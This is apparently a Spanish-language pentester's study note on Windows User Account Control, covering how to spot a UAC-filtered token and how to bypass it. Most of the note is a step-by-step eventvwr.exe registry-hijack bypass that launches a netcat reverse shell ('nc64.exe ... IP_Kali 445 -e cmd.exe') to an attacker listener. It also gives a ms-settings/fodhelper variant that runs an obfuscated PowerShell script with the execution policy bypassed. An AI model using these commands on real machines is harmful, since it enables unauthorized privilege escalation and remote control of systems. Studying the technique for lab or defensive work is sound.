# UAC

Tags: #UAC 

UAC (User Account Control) significa Control de cuentas de usuario. Es una función de seguridad de Windows que ayuda a evitar que programas o usuarios realicen cambios que requieren privilegios de administrador sin autorización.

| Situación                                                                 | ¿Te sirve la técnica?                                                                                      |
| ------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Eres administrador local, pero tu sesión tiene un token filtrado por UAC. | Es el escenario clásico que se investigaba.                                                                |
| No tienes RDP y solo tienes una shell remota de CMD o PowerShell.         | La falta de RDP no impide por sí sola el análisis; depende de tu contexto y de las condiciones de Windows. |

```powershell 
❯ whoami /all 
```
### Indicadores que debes revisar
- **Usuario:** identificar la cuenta con la que se ejecuta la shell.
- **Grupo** `BUILTIN\Administrators`**:** comprobar si está habilitado o aparece como `Group used for deny only`. Debe salir como ``Mandatory group, Enable by default..``
- **Nivel de integridad:** buscar `Medium Mandatory Level`, si es así tiene el UAC. Lo ideal es tener `High Mandatory Level`.
- **Privilegios:** revisar la sección `PRIVILEGES INFORMATION` y si se tienen pocos privilegios es señal de UAC

## Consultar el valor del UAC 

```powershell 
# Consultar el valor de EnableLUA
❯ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

    EnableLUA    REG_DWORD    0x1  # Si UAC está habilitado (`0x1`)
    EnableLUA    REG_DWORD    0x0  # Si UAC está deshabilitado (`0x0`)

NOTA:
	- Si esta habilitado hacer el bypass con 'Eventvwr'
```

## Fodhelper

`fodhelper.exe` se ha estudiado en el contexto de técnicas de bypass de UAC. La propiedad `autoElevate` en el manifiesto de un ejecutable puede indicar que Windows permite su elevación automática bajo determinadas condiciones.

```powershell 
❯ powershell -C Get-Content -Path C:\Windows\System32\fodhelper.exe | findstr /I "autoElevate"
```
## Eventvwr

`eventvwr.exe` se ha estudiado históricamente como parte de técnicas de bypass de UAC. La consulta intenta encontrar una indicación de elevación automática.

```powershell
Paso 1:
❯ powershell -C Get-Content -Path C:\Windows\System32\eventvwr.exe | findstr /I "autoElevate"

# Ejemplo de lo que sale:
	<autoElevate>true</autoElevate>
```

```powershell 
Paso 2:
# Modificar el resgitro desde CMD
❯ REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command

NOTA:
	- Dar en yes 
```

```powershell 
Paso 3:
# Crear o modificar la clave de resgitro acosciada con la apertura de archivos .msc
❯ REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /v DelegateExecute /t REG_SZ

NOTA:
	- Crea el valor de registro `DelegateExecute` de tipo cadena (`REG_SZ`).
```

```powershell 
Paso 4:
# Subir Netcat64 al server y ejecutar el comando 
❯ REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d "c:\temp\nc64.exe -nv IP_Kali 445 -e cmd.exe" /f

❯ rlwrap nc -nlvp 445   # Recibir la revershell 

Paso 5:
❯ eventvwr.exe   # Ejecutar la revershell 
```

```powershell 
# Otra forma 
❯ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass C:\users\robert\downloads\work2\obfuscated.ps1" -Force

NOTA:
	- Esta alternativa modifica una asociación de `ms-settings` para intentar ejecutar un script PowerShell con la política de ejecución omitida para ese proceso. No es equivalente a la técnica de `eventvwr.exe`: utiliza otra asociación del registro y requiere analizar sus condiciones específicas.
```